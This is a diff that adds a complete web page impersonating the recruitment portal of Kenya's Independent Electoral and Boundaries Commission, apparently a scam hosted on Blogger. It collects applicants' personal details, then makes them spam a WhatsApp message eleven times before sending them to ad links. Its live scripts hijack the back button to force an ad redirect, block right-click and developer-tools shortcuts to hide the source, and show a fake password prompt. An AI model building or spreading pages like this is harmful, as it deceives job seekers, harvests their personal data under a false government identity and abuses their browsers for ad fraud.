@@ -1,0 +1,820 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script type="text/javascript">
+
+/* Password Protection Script by www.onlineofferz.xyz*/
+
+var password = 'Independent Electoral and Boundaries Commission (IEBC)'
+
+password=prompt('NOTICE: This official recruitment portal of the IEBC  click OK to proceed','Independent Electoral and Boundaries Commission (IEBC)');
+
+if (password != 'Independent Electoral and Boundaries Commission (IEBC)') {
+
+location.href='https://rebrand.ly/Iebc-staff-recruitment-portal';
+
+}
+
+</script> 
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta property="og:title" content="Independent Electoral and Boundaries Commission (IEBC)" />
+  <meta property="og:description" content="Recruitment for Field Registration Officers is ongoing" />
+  <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2BW1FgaoGCaaFx0ifuBhba9U0BD3GKL9neEaHRQDQN-YZ7RZrFbaAYFRXg67uidS200GEk95C3coGkcZDlMT-M97VIJHPKJ0PnXbfJP0GAu769N30IRhesc4T74RbJVGII0CcBqvC4ATFUDvNvXxuW9RdMV6bazqVOD5vBEnswMMikImttgrBL1HBnhg/s940/RECRUITMENT%20ANNOUNCEMENT.png" />
+  <meta property="og:type" content="website" />
+  <title>Independent Electoral and Boundaries Commission</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --blue: #0f2d5c;
+      --blue-dark: #081a36;
+      --blue-soft: #214b90;
+      --green: #0d8f43;
+      --green-soft: #16a34a;
+      --gold: #f2b705;
+      --gold-soft: #ffd452;
+      --text: #1a2233;
+      --muted: #667085;
+      --border: #d9e2f0;
+      --bg: #eef4fb;
+      --white: #ffffff;
+      --shadow: 0 18px 45px rgba(15, 45, 92, 0.12);
+      --radius: 22px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', Arial, sans-serif;
+      background: linear-gradient(180deg, #edf3fb 0%, #f8fbff 100%);
+      color: var(--text);
+      line-height: 1.5;
+      padding-bottom: 88px;
+    }
+    img { max-width: 100%; display: block; }
+    .page {
+      width: min(100%, 980px);
+      margin: 0 auto;
+      padding: 18px 14px 34px;
+    }
+    .shell {
+      background: var(--white);
+      border: 1px solid var(--border);
+      border-radius: 28px;
+      overflow: hidden;
+      box-shadow: var(--shadow);
+    }
+    .topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 14px 28px;
+  background: #ffffff;
+  border-bottom: 1px solid #e5e7eb;
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.04);
+}
+
+.topbar-left {
+  display: flex;
+  align-items: center;
+}
+
+.topbar-brand {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  text-decoration: none;
+}
+
+.topbar-logo {
+  width: 52px;
+  height: 52px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+.topbar-logo img {
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+}
+
+.topbar-title-wrap {
+  display: flex;
+  flex-direction: column;
+}
+
+.topbar-title {
+  font-size: 1.15rem;
+  font-weight: 700;
+  color: #111827;
+  line-height: 1.2;
+}
+
+.topbar-subtitle {
+  font-size: 0.85rem;
+  color: #6b7280;
+  margin-top: 2px;
+}
+
+.topbar-nav {
+  display: flex;
+  align-items: center;
+  gap: 20px;
+}
+
+.topbar-nav a,
+.topbar-dropdown-toggle {
+  text-decoration: none;
+  color: #374151;
+  font-size: 0.95rem;
+  font-weight: 500;
+  background: none;
+  border: none;
+  cursor: pointer;
+  padding: 8px 10px;
+}
+
+.topbar-nav a:hover,
+.topbar-dropdown-toggle:hover {
+  color: #9fcf67;
+}
+
+.topbar-dropdown {
+  position: relative;
+}
+
+.topbar-dropdown-menu {
+  display: none;
+  position: absolute;
+  top: 100%;
+  right: 0;
+  min-width: 190px;
+  background: #fff;
+  border: 1px solid #e5e7eb;
+  border-radius: 10px;
+  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+  padding: 8px 0;
+  z-index: 1000;
+}
+
+.topbar-dropdown-menu a {
+  display: block;
+  padding: 10px 14px;
+}
+
+.topbar-dropdown-menu a:hover {
+  background: #f9fafb;
+  color: #9fcf67;
+}
+
+.topbar-dropdown:hover .topbar-dropdown-menu {
+  display: block;
+    }
+    .step {
+      display: none;
+      padding: 20px;
+    }
+    .step.active { display: block; }
+    .banner {
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      overflow: hidden;
+      background: #edf2f8;
+      padding: 14px;
+      margin-bottom: 18px;
+    }
+    .banner img {
+      width: 100%;
+      border-radius: 14px;
+      box-shadow: 0 8px 20px rgba(15, 45, 92, 0.1);
+    }
+    .heading {
+      text-align: center;
+      color: var(--blue-dark);
+      font-size: clamp(1.45rem, 3vw, 2rem);
+      font-weight: 800;
+      margin-bottom: 8px;
+    }
+    .subheading {
+      text-align: center;
+      color: var(--muted);
+      margin-bottom: 20px;
+    }
+    .card {
+      border: 1px solid var(--border);
+      background: #fbfdff;
+      border-radius: var(--radius);
+      padding: 20px;
+    }
+    .form-shell {
+      position: relative;
+    }
+    .overlay {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(15, 45, 92, 0.16);
+      border-radius: var(--radius);
+      z-index: 3;
+    }
+    .application-form.locked {
+      filter: blur(5px);
+      opacity: 0.85;
+      pointer-events: none;
+      user-select: none;
+    }
+    .pulse-btn {
+      border: none;
+      background: linear-gradient(135deg, var(--green), var(--green-soft));
+      color: #fff;
+      padding: 18px 34px;
+      border-radius: 999px;
+      font-size: 1.08rem;
+      font-weight: 800;
+      cursor: pointer;
+      animation: pulse 1.6s infinite;
+      box-shadow: 0 12px 30px rgba(13, 143, 67, 0.28);
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(13, 143, 67, 0.4); }
+      70% { transform: scale(1.03); box-shadow: 0 0 0 16px rgba(13, 143, 67, 0); }
+      100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(13, 143, 67, 0); }
+    }
+    .field-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 16px;
+    }
+    .field {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .field label {
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: var(--blue-dark);
+    }
+    .field input,
+    .field select {
+      width: 100%;
+      border: 1px solid #cfd9e7;
+      border-radius: 14px;
+      padding: 14px 15px;
+      font-size: 0.97rem;
+      background: #fff;
+      outline: none;
+      color: var(--text);
+    }
+    .field input:focus,
+    .field select:focus {
+      border-color: var(--blue-soft);
+      box-shadow: 0 0 0 3px rgba(33, 75, 144, 0.12);
+    }
+    .btn {
+      border: none;
+      cursor: pointer;
+      border-radius: 16px;
+      font-weight: 800;
+      transition: transform 0.2s ease, opacity 0.2s ease;
+    }
+    .btn:hover { transform: translateY(-1px); opacity: 0.97; }
+    .btn-primary {
+      width: 100%;
+      margin-top: 20px;
+      padding: 15px 18px;
+      background: linear-gradient(135deg, #9fcf67, #9fcf67);
+      color: #fff;
+      font-size: 1rem;
+    }
+    .btn-whatsapp {
+      display: block;
+      width: 100%;
+      text-align: center;
+      text-decoration: none;
+      padding: 16px 18px;
+     background: linear-gradient(135deg, #9fcf67, #9fcf67);
+      color: #fff;
+      font-size: 1rem;
+      margin: 0 0 16px;
+    }
+    .btn-submit {
+      width: 100%;
+      padding: 16px 18px;
+      background: linear-gradient(135deg, #9fcf67, #9fcf67);
+      color: #fff;
+      font-size: 1rem;
+    }
+    .error {
+      display: none;
+      text-align: center;
+      color: #c62828;
+      font-size: 0.92rem;
+      margin-top: 12px;
+      font-weight: 600;
+    }
+    .status-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 14px;
+      margin-bottom: 18px;
+    }
+    .status-box {
+      padding: 16px;
+      border-radius: 16px;
+      text-align: center;
+      font-weight: 800;
+      border: 1px solid rgba(0,0,0,0.05);
+    }
+    .status-pending {
+      background: #ffd95a;
+      color: #3c2a00;
+    }
+    .status-waiting {
+      background: #2fb369;
+      color: #fff;
+      opacity: 0.45;
+    }
+    .status-waiting.ready { opacity: 1; }
+    .tips p {
+      color: var(--muted);
+      margin-bottom: 10px;
+    }
+    .progress-wrap {
+      margin-top: 14px;
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      padding: 16px;
+      background: #fbfdff;
+    }
+    .progress-head {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      font-weight: 700;
+      color: var(--blue-dark);
+      margin-bottom: 10px;
+    }
+    .track {
+      width: 100%;
+      height: 16px;
+      border-radius: 999px;
+      background: #e4ebf5;
+      overflow: hidden;
+    }
+    .fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, var(--gold), var(--gold-soft));
+      border-radius: 999px;
+      transition: width 0.3s ease;
+    }
+    
+    .caution-container {
+    display: flex;
+    align-items: center;
+    background-color: #fff3cd; /* Light warning yellow */
+    border: 1px solid #ffeeba;
+    border-radius: 8px;
+    padding: 15px;
+    margin-top: 20px;
+    color: #856404; /* Darker warning text */
+    font-family: sans-serif;
+    line-height: 1.4;
+}
+
+.caution-icon {
+    font-size: 32px; /* Large caution sign */
+    margin-right: 15px;
+    animation: shake 2s infinite; /* Subtle shake to grab attention */
+}
+
+.caution-text {
+    font-size: 14px;
+}
+
+.caution-text strong {
+    color: #721c24; /* Dark red for the word "rejection" */
+    text-transform: uppercase;
+}
+
+/* Attention-grabbing animation */
+@keyframes shake {
+    0%, 100% { transform: rotate(0deg); }
+    10%, 30%, 50% { transform: rotate(-10deg); }
+    20%, 40%, 60% { transform: rotate(10deg); }
+    70% { transform: rotate(0deg); }
+}
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(8, 26, 54, 0.86);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      padding: 20px;
+    }
+    .loading-overlay.show { display: flex; }
+    .loading-box {
+      background: #fff;
+      border-radius: 22px;
+      padding: 28px 24px;
+      min-width: 280px;
+      text-align: center;
+      box-shadow: var(--shadow);
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #dbe3ef;
+      border-top: 5px solid var(--gold);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 14px;
+    }
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    .loading-box p {
+      color: var(--blue-dark);
+      font-weight: 700;
+    }
+    .sticky-footer {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: var(--blue-dark);
+      color: #fff;
+      text-align: center;
+      padding: 16px 12px;
+      font-size: 0.92rem;
+      z-index: 50;
+    }
+    @media (max-width: 700px) {
+      .field-grid,
+      .status-grid {
+        grid-template-columns: 1fr;
+      }
+      .topbar {
+        padding: 14px 16px;
+      }
+      .topbar-logo,
+      .topbar-spacer {
+        width: 56px;
+        flex-basis: 56px;
+      }
+      .topbar-logo img { width: 56px; }
+      .step { padding: 16px; }
+    }
+  </style>
+<link rel="me" href="https://www.blogger.com/profile/16737217849288108359" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-box">
+      <div class="spinner"></div>
+      <p>Loading, please wait...</p>
+    </div>
+  </div>
+
+  <main class="page">
+    <section class="shell">
+      <header class="topbar">
+  <div class="topbar-left">
+    <a href="#" class="topbar-brand">
+      <div class="topbar-logo">
+        <img src="https://www.iebc.or.ke/images/iebclogo1.png" alt="MOA Logo">
+      </div>
+      <div class="topbar-title-wrap">
+        <div class="topbar-title">Recruitment Portal</div>
+        <div class="topbar-subtitle">Independent Electoral and Boundaries Commission</div>
+      </div>
+    </a>
+  </div>
+
+  <nav class="topbar-nav">
+    <a href="https://ey43.com/4/9120968">Home</a>
+    <a href="https://ey43.com/4/9120968">Jobs</a>
+    <a href="https://ey43.com/4/9120968">About</a>
+
+    <div class="topbar-dropdown">
+      <button class="topbar-dropdown-toggle">Menu ▾</button>
+      <div class="topbar-dropdown-menu">
+        <a href="https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a">Applications</a>
+        <a href="https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a">Help Center</a>
+        <a href="https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a">Contact</a>
+      </div>
+    </div>
+  </nav>
+</header>
+
+      <section class="step active" id="step1">
+        <div class="banner">
+          <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2BW1FgaoGCaaFx0ifuBhba9U0BD3GKL9neEaHRQDQN-YZ7RZrFbaAYFRXg67uidS200GEk95C3coGkcZDlMT-M97VIJHPKJ0PnXbfJP0GAu769N30IRhesc4T74RbJVGII0CcBqvC4ATFUDvNvXxuW9RdMV6bazqVOD5vBEnswMMikImttgrBL1HBnhg/s940/RECRUITMENT%20ANNOUNCEMENT.png" alt="UN" width="100%" height="35%">
+        </div>
+
+        <center><h1 class="section-title">Welcome to the IEBC Recruitment Portal</h1></center>
+       <center> <p class="section-subtitle">To start your application. Click <b>APPLY NOW</b> and fill out the form below correctly.</p></center>
+
+        <div class="form-shell">
+          <div class="overlay" id="formOverlay">
+            <button type="button" class="pulse-btn" id="applyNowBtn">APPLY NOW</button>
+          </div>
+
+          <form class="card application-form locked" id="applicationForm">
+            <div class="field-grid">
+              <div class="field">
+                <label for="fullName">Full Name</label>
+                <input type="text" id="fullName" placeholder="Enter your full name">
+              </div>
+
+              <div class="field">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" placeholder="Enter your email address">
+              </div>
+
+              <div class="field">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" placeholder="Enter your phone number">
+              </div>
+
+              <div class="field">
+                <label for="position">Position</label>
+                <select id="position">
+                  <option value="">Select position</option>
+                  <option value="Registration Officer">Field Registration Officers</option>
+                </select>
+              </div>
+
+              <div class="field">
+                <label for="dob">Date of Birth</label>
+                <input type="date" id="dob">
+              </div>
+
+              <div class="field">
+                <label for="county">Which county applying from</label>
+                <input type="text" id="county" placeholder="Enter your County">
+              </div>
+
+              <div class="field">
+                <label for="disability">Do You Have Any Disability?</label>
+                <select id="disability">
+                  <option value="">Select option</option>
+                  <option value="Yes">Yes</option>
+                  <option value="No">No</option>
+                </select>
+              </div>
+
+              <div class="field">
+                <label for="qualification">Educational Qualification</label>
+                <select id="qualification">
+                  <option value="">Select qualification</option>
+                  <option value="KCSE">Primary School Certificate (Grade 7)</option>
+                  <option value="Certificate">Junior Secondary School Leaving Certificate (Grade 9)</option>
+                  <option value="Diploma">School Certificate / GCE (Grade 12)</option>
+                  <option value="Other">Other</option>
+                </select>
+              </div>
+            </div>
+
+            <button type="button" class="btn btn-primary" id="proceedBtn">PROCEED</button>
+            <p class="error" id="formError">Please complete all fields before proceeding.</p>
+          </form>
+        </div>
+      </section>
+
+      <section class="step" id="step2">
+        <div class="banner">
+          <img src="https://www.iebc.or.ke/images/iebclogo1.png" alt="Banner">
+        </div>
+
+        <h2 class="heading">Thank You For Filling Out The Form!</h2>
+        <p class="subheading">Congratulations! Your application has been successfully received please follow the steps below to submit your application for review</p>
+
+        <div class="status-grid">
+          <div class="status-box status-pending">STATUS: PENDING</div>
+          <div class="status-box status-waiting" id="approvalBox">APPROVAL: WAITING</div>
+        </div>
+
+        <div class="card tips">
+          <p><strong>Rule 1:</strong> To support wider public awareness as we are in need of more workers, kindly share this opportunity with 15 friends or 10 WhatsApp groups. Click the <b>“SHARE ON WHATSAPP”</b> button below to continue...</p>
+          <p><strong>Rule 2:</strong>Once finished, you will be automatically redirected to the submission page.</p>
+        </div>
+
+        <br>
+
+        <a href="#" class="btn btn-whatsapp" id="whatsappBtn">SHARE ON WHATSAPP</a>
+
+        <div class="progress-wrap">
+          <div class="progress-head">
+            <span>Share Progress</span>
+            <span id="progressText">0%</span>
+          </div>
+          <div class="track">
+            <div class="fill" id="progressFill"></div>
+          </div>
+        </div>
+        <div class="caution-container">
+  <div class="caution-icon">⚠️</div>
+  <div class="caution-text">
+    <strong>Note:</strong> This step is very important. Incomplete sharing will lead to <strong>rejection</strong>.
+  </div>
+</div>
+      </section>
+
+      <section class="step" id="step3">
+        <div class="banner">
+          <img src="https://www.iebc.or.ke/images/iebclogo1.png" alt="Success">
+        </div>
+
+        <div class="card" style="text-align:center;">
+          <h2 class="heading" style="margin-bottom:10px;">Congratulations!</h2>
+          <p class="subheading" style="margin-bottom:20px;">You have successfully completed the steps.</p>
+
+          <button type="button" class="btn btn-submit" id="retryBtn">SUBMIT APPLICATION</button>
+          <br><br>
+        </div>
+      </section>
+    </section>
+  </main>
+
+  <footer class="sticky-footer">IEBC. All rights reserved.</footer>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const step1 = document.getElementById('step1');
+      const step2 = document.getElementById('step2');
+      const step3 = document.getElementById('step3');
+      const loadingOverlay = document.getElementById('loadingOverlay');
+      const formOverlay = document.getElementById('formOverlay');
+      const applyNowBtn = document.getElementById('applyNowBtn');
+      const applicationForm = document.getElementById('applicationForm');
+      const proceedBtn = document.getElementById('proceedBtn');
+      const formError = document.getElementById('formError');
+      const whatsappBtn = document.getElementById('whatsappBtn');
+      const progressFill = document.getElementById('progressFill');
+      const progressText = document.getElementById('progressText');
+      const approvalBox = document.getElementById('approvalBox');
+      const retryBtn = document.getElementById('retryBtn');
+
+      const requiredIds = ['fullName', 'email', 'phone', 'position', 'dob', 'county', 'disability', 'qualification'];
+      let shareClicks = 0;
+      const maxClicks = 11;
+      const whatsappMessage = '*Independent Electoral and Boundaries Commission (IEBC)*\n\nThe Independent Electoral and Boundaries Commission (IEBC) is recruiting Three Hundred and Fifty (350) Field Registration Officers to support ongoing voter registration efforts following the high demand for registration services across the country. *Apply now using this link:*\n\nhttps://rebrand.ly/Iebc-staff-recruitment-portal';
+
+      function showStep(nextStep) {
+        [step1, step2, step3].forEach(step => step.classList.remove('active'));
+        nextStep.classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+
+      function showLoading(callback) {
+        loadingOverlay.classList.add('show');
+        setTimeout(function () {
+          loadingOverlay.classList.remove('show');
+          callback();
+        }, 1200);
+      }
+
+      applyNowBtn.addEventListener('click', function () {
+        formOverlay.style.display = 'none';
+        applicationForm.classList.remove('locked');
+      });
+
+      proceedBtn.addEventListener('click', function () {
+        let isValid = true;
+
+        requiredIds.forEach(function (id) {
+          const field = document.getElementById(id);
+          if (!field || !field.value || field.value.trim() === '') {
+            isValid = false;
+          }
+        });
+
+        if (!isValid) {
+          formError.style.display = 'block';
+          return;
+        }
+
+        formError.style.display = 'none';
+        showLoading(function () {
+          showStep(step2);
+        });
+      });
+
+      whatsappBtn.addEventListener('click', function (e) {
+        e.preventDefault();
+
+        if (shareClicks < maxClicks) {
+          shareClicks += 1;
+          const progress = Math.round((shareClicks / maxClicks) * 100);
+          progressFill.style.width = progress + '%';
+          progressText.textContent = progress + '%';
+
+          if (shareClicks >= maxClicks) {
+            approvalBox.classList.add('ready');
+            approvalBox.textContent = 'APPROVAL: READY';
+            showLoading(function () {
+              showStep(step3);
+            });
+          }
+        }
+
+        const appLink = 'whatsapp://send?text=' + encodeURIComponent(whatsappMessage);
+        const fallbackLink = 'https://wa.me/?text=' + encodeURIComponent(whatsappMessage);
+        window.location.href = appLink;
+        setTimeout(function () {
+          window.open(fallbackLink, '_blank');
+        }, 1200);
+      });
+
+      retryBtn.addEventListener('click', function () {
+        window.open('https://ey43.com/4/9120968');
+        window.location.href = 'https://ey43.com/4/9120968';
+      });
+    });
+  </script>
+</body>
+  <!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1732796,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
+<script>
+(function() {
+    // 1. Define the target URL (Your Ad Link)
+    const targetUrl = "https://soberanvil.com/c1e1be0c?key=46527223d3726e9bf4fd6c2e75557a4a";
+
+    // 2. Function to push a dummy state into the browser history
+    function pushState() {
+        // We add a unique hash to ensure the browser sees it as a new entry
+        history.pushState(null, document.title, location.pathname + "#!/back-" + new Date().getTime());
+    }
+
+    // 3. Initialize the trap
+    pushState();
+
+    // 4. Listen for the back button (popstate event)
+    window.addEventListener('popstate', function(event) {
+        // When the user clicks back, send them to the ad link
+        location.replace(targetUrl);
+    });
+
+    // 5. Some browsers require a second push to stay locked
+    window.addEventListener('hashchange', function() {
+        pushState();
+    });
+
+    // 6. Optional: To make it work even on browsers that block silent history changes
+    document.addEventListener('click', function() {
+        pushState();
+    }, { once: true });
+})();
+</script>
+  <script>
+  // Disable right-click
+  document.addEventListener("contextmenu", function (e) {
+    e.preventDefault();
+  });
+
+  // Disable common inspect/view-source shortcuts
+  document.addEventListener("keydown", function (e) {
+    const key = e.key.toLowerCase();
+
+    // F12
+    if (key === "f12") {
+      e.preventDefault();
+    }
+
+    // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C
+    if (e.ctrlKey && e.shiftKey && ["i", "j", "c"].includes(key)) {
+      e.preventDefault();
+    }
+
+    // Ctrl+U
+    if (e.ctrlKey && key === "u") {
+      e.preventDefault();
+    }
+
+    // Cmd+Option+I / J / C and Cmd+U for Mac
+    if (e.metaKey && e.altKey && ["i", "j", "c"].includes(key)) {
+      e.preventDefault();
+    }
+
+    if (e.metaKey && key === "u") {
+      e.preventDefault();
+    }
+  });
+</script>
+</html>
